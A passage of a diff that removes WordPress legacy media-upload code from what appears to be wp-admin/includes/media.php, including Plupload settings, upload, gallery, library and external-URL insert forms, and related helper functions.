- * Since 4.9 the `runtimes` setting is hardcoded in our version of Plupload to `html5,html4`,
- * and the `flash_swf_url` and `silverlight_xap_url` are not used.
- */
-$plupload_init = array(
-	'browse_button'       => 'plupload-browse-button',
-	'container'           => 'plupload-upload-ui',
-	'drop_element'        => 'drag-drop-area',
-	'file_data_name'      => 'async-upload',
-	'url'                 => $upload_action_url,
-	'filters' => array(
-		'max_file_size'   => $max_upload_size . 'b',
-	),
-	'multipart_params'    => $post_params,
-);
-
-// Currently only iOS Safari supports multiple files uploading but iOS 7.x has a bug that prevents uploading of videos
-// when enabled. See #29602.
-if ( wp_is_mobile() && strpos( $_SERVER['HTTP_USER_AGENT'], 'OS 7_' ) !== false &&
-	strpos( $_SERVER['HTTP_USER_AGENT'], 'like Mac OS X' ) !== false ) {
-
-	$plupload_init['multi_selection'] = false;
-}
-
-/**
- * Filters the default Plupload settings.
- *
- * @since 3.3.0
- *
- * @param array $plupload_init An array of default settings used by Plupload.
- */
-$plupload_init = apply_filters( 'plupload_init', $plupload_init );
-
-?>
-
-<script type="text/javascript">
-<?php
-// Verify size is an int. If not return default value.
-$large_size_h = absint( get_option('large_size_h') );
-if( !$large_size_h )
-	$large_size_h = 1024;
-$large_size_w = absint( get_option('large_size_w') );
-if( !$large_size_w )
-	$large_size_w = 1024;
-?>
-var resize_height = <?php echo $large_size_h; ?>, resize_width = <?php echo $large_size_w; ?>,
-wpUploaderInit = <?php echo wp_json_encode( $plupload_init ); ?>;
-</script>
-
-<div id="plupload-upload-ui" class="hide-if-no-js">
-<?php
-/**
- * Fires before the upload interface loads.
- *
- * @since 2.6.0 As 'pre-flash-upload-ui'
- * @since 3.3.0
- */
-do_action( 'pre-plupload-upload-ui' ); ?>
-<div id="drag-drop-area">
-	<div class="drag-drop-inside">
-	<p class="drag-drop-info"><?php _e('Drop files here'); ?></p>
-	<p><?php _ex('or', 'Uploader: Drop files here - or - Select Files'); ?></p>
-	<p class="drag-drop-buttons"><input id="plupload-browse-button" type="button" value="<?php esc_attr_e('Select Files'); ?>" class="button" /></p>
-	</div>
-</div>
-<?php
-/**
- * Fires after the upload interface loads.
- *
- * @since 2.6.0 As 'post-flash-upload-ui'
- * @since 3.3.0
- */
-do_action( 'post-plupload-upload-ui' ); ?>
-</div>
-
-<div id="html-upload-ui" class="hide-if-js">
-	<?php
-	/**
-	 * Fires before the upload button in the media upload interface.
-	 *
-	 * @since 2.6.0
-	 */
-	do_action( 'pre-html-upload-ui' );
-	?>
-	<p id="async-upload-wrap">
-		<label class="screen-reader-text" for="async-upload"><?php _e('Upload'); ?></label>
-		<input type="file" name="async-upload" id="async-upload" />
-		<?php submit_button( __( 'Upload' ), 'primary', 'html-upload', false ); ?>
-		<a href="#" onclick="try{top.tb_remove();}catch(e){}; return false;"><?php _e('Cancel'); ?></a>
-	</p>
-	<div class="clear"></div>
-<?php
-/**
- * Fires after the upload button in the media upload interface.
- *
- * @since 2.6.0
- */
-do_action( 'post-html-upload-ui' );
-?>
-</div>
-
-<p class="max-upload-size"><?php printf( __( 'Maximum upload file size: %s.' ), esc_html( size_format( $max_upload_size ) ) ); ?></p>
-<?php
-
-	/**
-	 * Fires on the post upload UI screen.
-	 *
-	 * Legacy (pre-3.5.0) media workflow hook.
-	 *
-	 * @since 2.6.0
-	 */
-	do_action( 'post-upload-ui' );
-}
-
-/**
- * Outputs the legacy media upload form for a given media type.
- *
- * @since 2.5.0
- *
- * @param string $type
- * @param object $errors
- * @param integer $id
- */
-function media_upload_type_form($type = 'file', $errors = null, $id = null) {
-
-	media_upload_header();
-
-	$post_id = isset( $_REQUEST['post_id'] )? intval( $_REQUEST['post_id'] ) : 0;
-
-	$form_action_url = admin_url("media-upload.php?type=$type&tab=type&post_id=$post_id");
-
-	/**
-	 * Filters the media upload form action URL.
-	 *
-	 * @since 2.6.0
-	 *
-	 * @param string $form_action_url The media upload form action URL.
-	 * @param string $type            The type of media. Default 'file'.
-	 */
-	$form_action_url = apply_filters( 'media_upload_form_url', $form_action_url, $type );
-	$form_class = 'media-upload-form type-form validate';
-
-	if ( get_user_setting('uploader') )
-		$form_class .= ' html-uploader';
-?>
-
-<form enctype="multipart/form-data" method="post" action="<?php echo esc_url( $form_action_url ); ?>" class="<?php echo $form_class; ?>" id="<?php echo $type; ?>-form">
-<?php submit_button( '', 'hidden', 'save', false ); ?>
-<input type="hidden" name="post_id" id="post_id" value="<?php echo (int) $post_id; ?>" />
-<?php wp_nonce_field('media-form'); ?>
-
-<h3 class="media-title"><?php _e('Add media files from your computer'); ?></h3>
-
-<?php media_upload_form( $errors ); ?>
-
-<script type="text/javascript">
-jQuery(function($){
-	var preloaded = $(".media-item.preloaded");
-	if ( preloaded.length > 0 ) {
-		preloaded.each(function(){prepareMediaItem({id:this.id.replace(/[^0-9]/g, '')},'');});
-	}
-	updateMediaForm();
-});
-</script>
-<div id="media-items"><?php
-
-if ( $id ) {
-	if ( !is_wp_error($id) ) {
-		add_filter('attachment_fields_to_edit', 'media_post_single_attachment_fields_to_edit', 10, 2);
-		echo get_media_items( $id, $errors );
-	} else {
-		echo '<div id="media-upload-error">'.esc_html($id->get_error_message()).'</div></div>';
-		exit;
-	}
-}
-?></div>
-
-<p class="savebutton ml-submit">
-<?php submit_button( __( 'Save all changes' ), '', 'save', false ); ?>
-</p>
-</form>
-<?php
-}
-
-/**
- * Outputs the legacy media upload form for external media.
- *
- * @since 2.7.0
- *
- * @param string $type
- * @param object $errors
- * @param integer $id
- */
-function media_upload_type_url_form($type = null, $errors = null, $id = null) {
-	if ( null === $type )
-		$type = 'image';
-
-	media_upload_header();
-
-	$post_id = isset( $_REQUEST['post_id'] ) ? intval( $_REQUEST['post_id'] ) : 0;
-
-	$form_action_url = admin_url("media-upload.php?type=$type&tab=type&post_id=$post_id");
-	/** This filter is documented in wp-admin/includes/media.php */
-	$form_action_url = apply_filters( 'media_upload_form_url', $form_action_url, $type );
-	$form_class = 'media-upload-form type-form validate';
-
-	if ( get_user_setting('uploader') )
-		$form_class .= ' html-uploader';
-?>
-
-<form enctype="multipart/form-data" method="post" action="<?php echo esc_url( $form_action_url ); ?>" class="<?php echo $form_class; ?>" id="<?php echo $type; ?>-form">
-<input type="hidden" name="post_id" id="post_id" value="<?php echo (int) $post_id; ?>" />
-<?php wp_nonce_field('media-form'); ?>
-
-<h3 class="media-title"><?php _e('Insert media from another website'); ?></h3>
-
-<script type="text/javascript">
-var addExtImage = {
-
-	width : '',
-	height : '',
-	align : 'alignnone',
-
-	insert : function() {
-		var t = this, html, f = document.forms[0], cls, title = '', alt = '', caption = '';
-
-		if ( '' == f.src.value || '' == t.width )
-			return false;
-
-		if ( f.alt.value )
-			alt = f.alt.value.replace(/'/g, '&#039;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-
-<?php
-	/** This filter is documented in wp-admin/includes/media.php */
-	if ( ! apply_filters( 'disable_captions', '' ) ) {
-		?>
-		if ( f.caption.value ) {
-			caption = f.caption.value.replace(/\r\n|\r/g, '\n');
-			caption = caption.replace(/<[a-zA-Z0-9]+( [^<>]+)?>/g, function(a){
-				return a.replace(/[\r\n\t]+/, ' ');
-			});
-
-			caption = caption.replace(/\s*\n\s*/g, '<br />');
-		}
-<?php } ?>
-
-		cls = caption ? '' : ' class="'+t.align+'"';
-
-		html = '<img alt="'+alt+'" src="'+f.src.value+'"'+cls+' width="'+t.width+'" height="'+t.height+'" />';
-
-		if ( f.url.value ) {
-			url = f.url.value.replace(/'/g, '&#039;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-			html = '<a href="'+url+'">'+html+'</a>';
-		}
-
-		if ( caption )
-			html = '[caption id="" align="'+t.align+'" width="'+t.width+'"]'+html+caption+'[/caption]';
-
-		var win = window.dialogArguments || opener || parent || top;
-		win.send_to_editor(html);
-		return false;
-	},
-
-	resetImageData : function() {
-		var t = addExtImage;
-
-		t.width = t.height = '';
-		document.getElementById('go_button').style.color = '#bbb';
-		if ( ! document.forms[0].src.value )
-			document.getElementById('status_img').innerHTML = '';
-		else document.getElementById('status_img').innerHTML = '<img src="<?php echo esc_url( admin_url( 'images/no.png' ) ); ?>" alt="" />';
-	},
-
-	updateImageData : function() {
-		var t = addExtImage;
-
-		t.width = t.preloadImg.width;
-		t.height = t.preloadImg.height;
-		document.getElementById('go_button').style.color = '#333';
-		document.getElementById('status_img').innerHTML = '<img src="<?php echo esc_url( admin_url( 'images/yes.png' ) ); ?>" alt="" />';
-	},
-
-	getImageData : function() {
-		if ( jQuery('table.describe').hasClass('not-image') )
-			return;
-
-		var t = addExtImage, src = document.forms[0].src.value;
-
-		if ( ! src ) {
-			t.resetImageData();
-			return false;
-		}
-
-		document.getElementById('status_img').innerHTML = '<img src="<?php echo esc_url( admin_url( 'images/spinner-2x.gif' ) ); ?>" alt="" width="16" height="16" />';
-		t.preloadImg = new Image();
-		t.preloadImg.onload = t.updateImageData;
-		t.preloadImg.onerror = t.resetImageData;
-		t.preloadImg.src = src;
-	}
-};
-
-jQuery(document).ready( function($) {
-	$('.media-types input').click( function() {
-		$('table.describe').toggleClass('not-image', $('#not-image').prop('checked') );
-	});
-});
-</script>
-
-<div id="media-items">
-<div class="media-item media-blank">
-<?php
-/**
- * Filters the insert media from URL form HTML.
- *
- * @since 3.3.0
- *
- * @param string $form_html The insert from URL form HTML.
- */
-echo apply_filters( 'type_url_form_media', wp_media_insert_url_form( $type ) );
-?>
-</div>
-</div>
-</form>
-<?php
-}
-
-/**
- * Adds gallery form to upload iframe
- *
- * @since 2.5.0
- *
- * @global string $redir_tab
- * @global string $type
- * @global string $tab
- *
- * @param array $errors
- */
-function media_upload_gallery_form($errors) {
-	global $redir_tab, $type;
-
-	$redir_tab = 'gallery';
-	media_upload_header();
-
-	$post_id = intval($_REQUEST['post_id']);
-	$form_action_url = admin_url("media-upload.php?type=$type&tab=gallery&post_id=$post_id");
-	/** This filter is documented in wp-admin/includes/media.php */
-	$form_action_url = apply_filters( 'media_upload_form_url', $form_action_url, $type );
-	$form_class = 'media-upload-form validate';
-
-	if ( get_user_setting('uploader') )
-		$form_class .= ' html-uploader';
-?>
-
-<script type="text/javascript">
-jQuery(function($){
-	var preloaded = $(".media-item.preloaded");
-	if ( preloaded.length > 0 ) {
-		preloaded.each(function(){prepareMediaItem({id:this.id.replace(/[^0-9]/g, '')},'');});
-		updateMediaForm();
-	}
-});
-</script>
-<div id="sort-buttons" class="hide-if-no-js">
-<span>
-<?php _e('All Tabs:'); ?>
-<a href="#" id="showall"><?php _e('Show'); ?></a>
-<a href="#" id="hideall" style="display:none;"><?php _e('Hide'); ?></a>
-</span>
-<?php _e('Sort Order:'); ?>
-<a href="#" id="asc"><?php _e('Ascending'); ?></a> |
-<a href="#" id="desc"><?php _e('Descending'); ?></a> |
-<a href="#" id="clear"><?php _ex('Clear', 'verb'); ?></a>
-</div>
-<form enctype="multipart/form-data" method="post" action="<?php echo esc_url( $form_action_url ); ?>" class="<?php echo $form_class; ?>" id="gallery-form">
-<?php wp_nonce_field('media-form'); ?>
-<?php //media_upload_form( $errors ); ?>
-<table class="widefat">
-<thead><tr>
-<th><?php _e('Media'); ?></th>
-<th class="order-head"><?php _e('Order'); ?></th>
-<th class="actions-head"><?php _e('Actions'); ?></th>
-</tr></thead>
-</table>
-<div id="media-items">
-<?php add_filter('attachment_fields_to_edit', 'media_post_single_attachment_fields_to_edit', 10, 2); ?>
-<?php echo get_media_items($post_id, $errors); ?>
-</div>
-
-<p class="ml-submit">
-<?php submit_button( __( 'Save all changes' ), 'savebutton', 'save', false, array( 'id' => 'save-all', 'style' => 'display: none;' ) ); ?>
-<input type="hidden" name="post_id" id="post_id" value="<?php echo (int) $post_id; ?>" />
-<input type="hidden" name="type" value="<?php echo esc_attr( $GLOBALS['type'] ); ?>" />
-<input type="hidden" name="tab" value="<?php echo esc_attr( $GLOBALS['tab'] ); ?>" />
-</p>
-
-<div id="gallery-settings" style="display:none;">
-<div class="title"><?php _e('Gallery Settings'); ?></div>
-<table id="basic" class="describe"><tbody>
-	<tr>
-	<th scope="row" class="label">
-		<label>
-		<span class="alignleft"><?php _e('Link thumbnails to:'); ?></span>
-		</label>
-	</th>
-	<td class="field">
-		<input type="radio" name="linkto" id="linkto-file" value="file" />
-		<label for="linkto-file" class="radio"><?php _e('Image File'); ?></label>
-
-		<input type="radio" checked="checked" name="linkto" id="linkto-post" value="post" />
-		<label for="linkto-post" class="radio"><?php _e('Attachment Page'); ?></label>
-	</td>
-	</tr>
-
-	<tr>
-	<th scope="row" class="label">
-		<label>
-		<span class="alignleft"><?php _e('Order images by:'); ?></span>
-		</label>
-	</th>
-	<td class="field">
-		<select id="orderby" name="orderby">
-			<option value="menu_order" selected="selected"><?php _e('Menu order'); ?></option>
-			<option value="title"><?php _e('Title'); ?></option>
-			<option value="post_date"><?php _e('Date/Time'); ?></option>
-			<option value="rand"><?php _e('Random'); ?></option>
-		</select>
-	</td>
-	</tr>
-
-	<tr>
-	<th scope="row" class="label">
-		<label>
-		<span class="alignleft"><?php _e('Order:'); ?></span>
-		</label>
-	</th>
-	<td class="field">
-		<input type="radio" checked="checked" name="order" id="order-asc" value="asc" />
-		<label for="order-asc" class="radio"><?php _e('Ascending'); ?></label>
-
-		<input type="radio" name="order" id="order-desc" value="desc" />
-		<label for="order-desc" class="radio"><?php _e('Descending'); ?></label>
-	</td>
-	</tr>
-
-	<tr>
-	<th scope="row" class="label">
-		<label>
-		<span class="alignleft"><?php _e('Gallery columns:'); ?></span>
-		</label>
-	</th>
-	<td class="field">
-		<select id="columns" name="columns">
-			<option value="1">1</option>
-			<option value="2">2</option>
-			<option value="3" selected="selected">3</option>
-			<option value="4">4</option>
-			<option value="5">5</option>
-			<option value="6">6</option>
-			<option value="7">7</option>
-			<option value="8">8</option>
-			<option value="9">9</option>
-		</select>
-	</td>
-	</tr>
-</tbody></table>
-
-<p class="ml-submit">
-<input type="button" class="button" style="display:none;" onMouseDown="wpgallery.update();" name="insert-gallery" id="insert-gallery" value="<?php esc_attr_e( 'Insert gallery' ); ?>" />
-<input type="button" class="button" style="display:none;" onMouseDown="wpgallery.update();" name="update-gallery" id="update-gallery" value="<?php esc_attr_e( 'Update gallery settings' ); ?>" />
-</p>
-</div>
-</form>
-<?php
-}
-
-/**
- * Outputs the legacy media upload form for the media library.
- *
- * @since 2.5.0
- *
- * @global wpdb      $wpdb
- * @global WP_Query  $wp_query
- * @global WP_Locale $wp_locale
- * @global string    $type
- * @global string    $tab
- * @global array     $post_mime_types
- *
- * @param array $errors
- */
-function media_upload_library_form($errors) {
-	global $wpdb, $wp_query, $wp_locale, $type, $tab, $post_mime_types;
-
-	media_upload_header();
-
-	$post_id = isset( $_REQUEST['post_id'] ) ? intval( $_REQUEST['post_id'] ) : 0;
-
-	$form_action_url = admin_url("media-upload.php?type=$type&tab=library&post_id=$post_id");
-	/** This filter is documented in wp-admin/includes/media.php */
-	$form_action_url = apply_filters( 'media_upload_form_url', $form_action_url, $type );
-	$form_class = 'media-upload-form validate';
-
-	if ( get_user_setting('uploader') )
-		$form_class .= ' html-uploader';
-
-	$q = $_GET;
-	$q['posts_per_page'] = 10;
-	$q['paged'] = isset( $q['paged'] ) ? intval( $q['paged'] ) : 0;
-	if ( $q['paged'] < 1 ) {
-		$q['paged'] = 1;
-	}
-	$q['offset'] = ( $q['paged'] - 1 ) * 10;
-	if ( $q['offset'] < 1 ) {
-		$q['offset'] = 0;
-	}
-
-	list($post_mime_types, $avail_post_mime_types) = wp_edit_attachments_query( $q );
-
-?>
-
-<form id="filter" method="get">
-<input type="hidden" name="type" value="<?php echo esc_attr( $type ); ?>" />
-<input type="hidden" name="tab" value="<?php echo esc_attr( $tab ); ?>" />
-<input type="hidden" name="post_id" value="<?php echo (int) $post_id; ?>" />
-<input type="hidden" name="post_mime_type" value="<?php echo isset( $_GET['post_mime_type'] ) ? esc_attr( $_GET['post_mime_type'] ) : ''; ?>" />
-<input type="hidden" name="context" value="<?php echo isset( $_GET['context'] ) ? esc_attr( $_GET['context'] ) : ''; ?>" />
-
-<p id="media-search" class="search-box">
-	<label class="screen-reader-text" for="media-search-input"><?php _e('Search Media');?>:</label>
-	<input type="search" id="media-search-input" name="s" value="<?php the_search_query(); ?>" />
-	<?php submit_button( __( 'Search Media' ), '', '', false ); ?>
-</p>
-
-<ul class="subsubsub">
-<?php
-$type_links = array();
-$_num_posts = (array) wp_count_attachments();
-$matches = wp_match_mime_types(array_keys($post_mime_types), array_keys($_num_posts));
-foreach ( $matches as $_type => $reals )
-	foreach ( $reals as $real )
-		if ( isset($num_posts[$_type]) )
-			$num_posts[$_type] += $_num_posts[$real];
-		else
-			$num_posts[$_type] = $_num_posts[$real];
-// If available type specified by media button clicked, filter by that type
-if ( empty($_GET['post_mime_type']) && !empty($num_posts[$type]) ) {
-	$_GET['post_mime_type'] = $type;
-	list($post_mime_types, $avail_post_mime_types) = wp_edit_attachments_query();
-}
-if ( empty($_GET['post_mime_type']) || $_GET['post_mime_type'] == 'all' )
-	$class = ' class="current"';
-else
-	$class = '';
-$type_links[] = '<li><a href="' . esc_url(add_query_arg(array('post_mime_type'=>'all', 'paged'=>false, 'm'=>false))) . '"' . $class . '>' . __('All Types') . '</a>';
-foreach ( $post_mime_types as $mime_type => $label ) {
-	$class = '';
-
-	if ( !wp_match_mime_types($mime_type, $avail_post_mime_types) )
-		continue;
-
-	if ( isset($_GET['post_mime_type']) && wp_match_mime_types($mime_type, $_GET['post_mime_type']) )
-		$class = ' class="current"';
-
-	$type_links[] = '<li><a href="' . esc_url(add_query_arg(array('post_mime_type'=>$mime_type, 'paged'=>false))) . '"' . $class . '>' . sprintf( translate_nooped_plural( $label[2], $num_posts[$mime_type] ), '<span id="' . $mime_type . '-counter">' . number_format_i18n( $num_posts[$mime_type] ) . '</span>') . '</a>';
-}
-/**
- * Filters the media upload mime type list items.
- *
- * Returned values should begin with an `<li>` tag.
- *
- * @since 3.1.0
- *
- * @param array $type_links An array of list items containing mime type link HTML.
- */
-echo implode(' | </li>', apply_filters( 'media_upload_mime_type_links', $type_links ) ) . '</li>';
-unset($type_links);
-?>
-</ul>
-
-<div class="tablenav">
-
-<?php
-$page_links = paginate_links( array(
-	'base' => add_query_arg( 'paged', '%#%' ),
-	'format' => '',
-	'prev_text' => __('&laquo;'),
-	'next_text' => __('&raquo;'),
-	'total' => ceil($wp_query->found_posts / 10),
-	'current' => $q['paged'],
-));
-
-if ( $page_links )
-	echo "<div class='tablenav-pages'>$page_links</div>";
-?>
-
-<div class="alignleft actions">
-<?php
-
-$arc_query = "SELECT DISTINCT YEAR(post_date) AS yyear, MONTH(post_date) AS mmonth FROM $wpdb->posts WHERE post_type = 'attachment' ORDER BY post_date DESC";
-
-$arc_result = $wpdb->get_results( $arc_query );
-
-$month_count = count($arc_result);
-$selected_month = isset( $_GET['m'] ) ? $_GET['m'] : 0;
-
-if ( $month_count && !( 1 == $month_count && 0 == $arc_result[0]->mmonth ) ) { ?>
-<select name='m'>
-<option<?php selected( $selected_month, 0 ); ?> value='0'><?php _e( 'All dates' ); ?></option>
-<?php
-foreach ($arc_result as $arc_row) {
-	if ( $arc_row->yyear == 0 )
-		continue;
-	$arc_row->mmonth = zeroise( $arc_row->mmonth, 2 );
-
-	if ( $arc_row->yyear . $arc_row->mmonth == $selected_month )
-		$default = ' selected="selected"';
-	else
-		$default = '';
-
-	echo "<option$default value='" . esc_attr( $arc_row->yyear . $arc_row->mmonth ) . "'>";
-	echo esc_html( $wp_locale->get_month($arc_row->mmonth) . " $arc_row->yyear" );
-	echo "</option>\n";
-}
-?>
-</select>
-<?php } ?>
-
-<?php submit_button( __( 'Filter &#187;' ), '', 'post-query-submit', false ); ?>
-
-</div>
-
-<br class="clear" />
-</div>
-</form>
-
-<form enctype="multipart/form-data" method="post" action="<?php echo esc_url( $form_action_url ); ?>" class="<?php echo $form_class; ?>" id="library-form">
-
-<?php wp_nonce_field('media-form'); ?>
-<?php //media_upload_form( $errors ); ?>
-
-<script type="text/javascript">
-<!--
-jQuery(function($){
-	var preloaded = $(".media-item.preloaded");
-	if ( preloaded.length > 0 ) {
-		preloaded.each(function(){prepareMediaItem({id:this.id.replace(/[^0-9]/g, '')},'');});
-		updateMediaForm();
-	}
-});
--->
-</script>
-
-<div id="media-items">
-<?php add_filter('attachment_fields_to_edit', 'media_post_single_attachment_fields_to_edit', 10, 2); ?>
-<?php echo get_media_items(null, $errors); ?>
-</div>
-<p class="ml-submit">
-<?php submit_button( __( 'Save all changes' ), 'savebutton', 'save', false ); ?>
-<input type="hidden" name="post_id" id="post_id" value="<?php echo (int) $post_id; ?>" />
-</p>
-</form>
-<?php
-}
-
-/**
- * Creates the form for external url
- *
- * @since 2.7.0
- *
- * @param string $default_view
- * @return string the form html
- */
-function wp_media_insert_url_form( $default_view = 'image' ) {
-	/** This filter is documented in wp-admin/includes/media.php */
-	if ( ! apply_filters( 'disable_captions', '' ) ) {
-		$caption = '
-		<tr class="image-only">
-			<th scope="row" class="label">
-				<label for="caption"><span class="alignleft">' . __('Image Caption') . '</span></label>
-			</th>
-			<td class="field"><textarea id="caption" name="caption"></textarea></td>
-		</tr>
-';
-	} else {
-		$caption = '';
-	}
-
-	$default_align = get_option('image_default_align');
-	if ( empty($default_align) )
-		$default_align = 'none';
-
-	if ( 'image' == $default_view ) {
-		$view = 'image-only';
-		$table_class = '';
-	} else {
-		$view = $table_class = 'not-image';
-	}
-
-	return '
-	<p class="media-types"><label><input type="radio" name="media_type" value="image" id="image-only"' . checked( 'image-only', $view, false ) . ' /> ' . __( 'Image' ) . '</label> &nbsp; &nbsp; <label><input type="radio" name="media_type" value="generic" id="not-image"' . checked( 'not-image', $view, false ) . ' /> ' . __( 'Audio, Video, or Other File' ) . '</label></p>
-	<p class="media-types media-types-required-info">' . sprintf( __( 'Required fields are marked %s' ), '<span class="required">*</span>' ) . '</p>
-	<table class="describe ' . $table_class . '"><tbody>
-		<tr>
-			<th scope="row" class="label" style="width:130px;">
-				<label for="src"><span class="alignleft">' . __( 'URL' ) . '</span> <span class="required">*</span></label>
-				<span class="alignright" id="status_img"></span>
-			</th>
-			<td class="field"><input id="src" name="src" value="" type="text" required aria-required="true" onblur="addExtImage.getImageData()" /></td>
-		</tr>
-
-		<tr>
-			<th scope="row" class="label">
-				<label for="title"><span class="alignleft">' . __( 'Title' ) . '</span> <span class="required">*</span></label>
-			</th>
-			<td class="field"><input id="title" name="title" value="" type="text" required aria-required="true" /></td>
-		</tr>
-
-		<tr class="not-image"><td></td><td><p class="help">' . __('Link text, e.g. &#8220;Ransom Demands (PDF)&#8221;') . '</p></td></tr>
-
-		<tr class="image-only">
-			<th scope="row" class="label">
-				<label for="alt"><span class="alignleft">' . __('Alternative Text') . '</span></label>
-			</th>
-			<td class="field"><input id="alt" name="alt" value="" type="text" aria-required="true" />
-			<p class="help">' . __('Alt text for the image, e.g. &#8220;The Mona Lisa&#8221;') . '</p></td>
-		</tr>
-		' . $caption . '
-		<tr class="align image-only">
-			<th scope="row" class="label"><p><label for="align">' . __('Alignment') . '</label></p></th>
-			<td class="field">
-				<input name="align" id="align-none" value="none" onclick="addExtImage.align=\'align\'+this.value" type="radio"' . ($default_align == 'none' ? ' checked="checked"' : '').' />
-				<label for="align-none" class="align image-align-none-label">' . __('None') . '</label>
-				<input name="align" id="align-left" value="left" onclick="addExtImage.align=\'align\'+this.value" type="radio"' . ($default_align == 'left' ? ' checked="checked"' : '').' />
-				<label for="align-left" class="align image-align-left-label">' . __('Left') . '</label>
-				<input name="align" id="align-center" value="center" onclick="addExtImage.align=\'align\'+this.value" type="radio"' . ($default_align == 'center' ? ' checked="checked"' : '').' />
-				<label for="align-center" class="align image-align-center-label">' . __('Center') . '</label>
-				<input name="align" id="align-right" value="right" onclick="addExtImage.align=\'align\'+this.value" type="radio"' . ($default_align == 'right' ? ' checked="checked"' : '').' />
-				<label for="align-right" class="align image-align-right-label">' . __('Right') . '</label>
-			</td>
-		</tr>
-
-		<tr class="image-only">
-			<th scope="row" class="label">
-				<label for="url"><span class="alignleft">' . __('Link Image To:') . '</span></label>
-			</th>
-			<td class="field"><input id="url" name="url" value="" type="text" /><br />
-
-			<button type="button" class="button" value="" onclick="document.forms[0].url.value=null">' . __('None') . '</button>
-			<button type="button" class="button" value="" onclick="document.forms[0].url.value=document.forms[0].src.value">' . __('Link to image') . '</button>
-			<p class="help">' . __('Enter a link URL or click above for presets.') . '</p></td>
-		</tr>
-		<tr class="image-only">
-			<td></td>
-			<td>
-				<input type="button" class="button" id="go_button" style="color:#bbb;" onclick="addExtImage.insert()" value="' . esc_attr__('Insert into Post') . '" />
-			</td>
-		</tr>
-		<tr class="not-image">
-			<td></td>
-			<td>
-				' . get_submit_button( __( 'Insert into Post' ), '', 'insertonlybutton', false ) . '
-			</td>
-		</tr>
-	</tbody></table>
-';
-
-}
-
-/**
- * Displays the multi-file uploader message.
- *
- * @since 2.6.0
- *
- * @global int $post_ID
- */
-function media_upload_flash_bypass() {
-	$browser_uploader = admin_url( 'media-new.php?browser-uploader' );
-
-	if ( $post = get_post() )
-		$browser_uploader .= '&amp;post_id=' . intval( $post->ID );
-	elseif ( ! empty( $GLOBALS['post_ID'] ) )
-		$browser_uploader .= '&amp;post_id=' . intval( $GLOBALS['post_ID'] );
-
-	?>
-	<p class="upload-flash-bypass">
-	<?php printf( __( 'You are using the multi-file uploader. Problems? Try the <a href="%1$s" target="%2$s">browser uploader</a> instead.' ), $browser_uploader, '_blank' ); ?>
-	</p>
-	<?php
-}
-
-/**
- * Displays the browser's built-in uploader message.
- *
- * @since 2.6.0
- */
-function media_upload_html_bypass() {
-	?>
-	<p class="upload-html-bypass hide-if-no-js">
-	   <?php _e('You are using the browser&#8217;s built-in file uploader. The WordPress uploader includes multiple file selection and drag and drop capability. <a href="#">Switch to the multi-file uploader</a>.'); ?>
-	</p>
-	<?php
-}
-
-/**
- * Used to display a "After a file has been uploaded..." help message.
- *
- * @since 3.3.0
- */
-function media_upload_text_after() {}
-
-/**
- * Displays the checkbox to scale images.
- *
- * @since 3.3.0
- */
-function media_upload_max_image_resize() {
-	$checked = get_user_setting('upload_resize') ? ' checked="true"' : '';
-	$a = $end = '';
-
-	if ( current_user_can( 'manage_options' ) ) {
-		$a = '<a href="' . esc_url( admin_url( 'options-media.php' ) ) . '" target="_blank">';
-		$end = '</a>';
-	}
-?>
-<p class="hide-if-no-js"><label>
-<input name="image_resize" type="checkbox" id="image_resize" value="true"<?php echo $checked; ?> />
-<?php
-	/* translators: %1$s is link start tag, %2$s is link end tag, %3$d is width, %4$d is height*/
-	printf( __( 'Scale images to match the large size selected in %1$simage options%2$s (%3$d &times; %4$d).' ), $a, $end, (int) get_option( 'large_size_w', '1024' ), (int) get_option( 'large_size_h', '1024' ) );
-?>
-</label></p>
-<?php
-}
-
-/**
- * Displays the out of storage quota message in Multisite.
- *
- * @since 3.5.0
- */
-function multisite_over_quota_message() {
-	echo '<p>' . sprintf( __( 'Sorry, you have used all of your storage quota of %s MB.' ), get_space_allowed() ) . '</p>';
-}
-
-/**
- * Displays the image and editor in the post editor
- *
- * @since 3.5.0
- *
- * @param WP_Post $post A post object.
- */
-function edit_form_image_editor( $post ) {
-	$open = isset( $_GET['image-editor'] );
-	if ( $open )
-		require_once ABSPATH . 'wp-admin/includes/image-edit.php';
-
-	$thumb_url = false;
-	if ( $attachment_id = intval( $post->ID ) )
-		$thumb_url = wp_get_attachment_image_src( $attachment_id, array( 900, 450 ), true );
-
-	$alt_text = get_post_meta( $post->ID, '_wp_attachment_image_alt', true );
-
-	$att_url = wp_get_attachment_url( $post->ID ); ?>
-	<div class="wp_attachment_holder wp-clearfix">
-	<?php
-	if ( wp_attachment_is_image( $post->ID ) ) :
-		$image_edit_button = '';
-		if ( wp_image_editor_supports( array( 'mime_type' => $post->post_mime_type ) ) ) {
-			$nonce = wp_create_nonce( "image_editor-$post->ID" );
-			$image_edit_button = "<input type='button' id='imgedit-open-btn-$post->ID' onclick='imageEdit.open( $post->ID, \"$nonce\" )' class='button' value='" . esc_attr__( 'Edit Image' ) . "' /> <span class='spinner'></span>";
-		}
-	?>
-
-		<div class="imgedit-response" id="imgedit-response-<?php echo $attachment_id; ?>"></div>
-
-		<div<?php if ( $open ) echo ' style="display:none"'; ?> class="wp_attachment_image wp-clearfix" id="media-head-<?php echo $attachment_id; ?>">
-			<p id="thumbnail-head-<?php echo $attachment_id; ?>"><img class="thumbnail" src="<?php echo set_url_scheme( $thumb_url[0] ); ?>" style="max-width:100%" alt="" /></p>
-			<p><?php echo $image_edit_button; ?></p>
-		</div>
-		<div<?php if ( ! $open ) echo ' style="display:none"'; ?> class="image-editor" id="image-editor-<?php echo $attachment_id; ?>">
-			<?php if ( $open ) wp_image_editor( $attachment_id ); ?>
-		</div>
-	<?php
-	elseif ( $attachment_id && wp_attachment_is( 'audio', $post ) ):
-
-		wp_maybe_generate_attachment_metadata( $post );
-
-		echo wp_audio_shortcode( array( 'src' => $att_url ) );
-
-	elseif ( $attachment_id && wp_attachment_is( 'video', $post ) ):
-
-		wp_maybe_generate_attachment_metadata( $post );
-
-		$meta = wp_get_attachment_metadata( $attachment_id );
-		$w = ! empty( $meta['width'] ) ? min( $meta['width'], 640 ) : 0;
-		$h = ! empty( $meta['height'] ) ? $meta['height'] : 0;
-		if ( $h && $w < $meta['width'] ) {
-			$h = round( ( $meta['height'] * $w ) / $meta['width'] );
-		}
-
-		$attr = array( 'src' => $att_url );
-		if ( ! empty( $w ) && ! empty( $h ) ) {
-			$attr['width'] = $w;
-			$attr['height'] = $h;
-		}
-
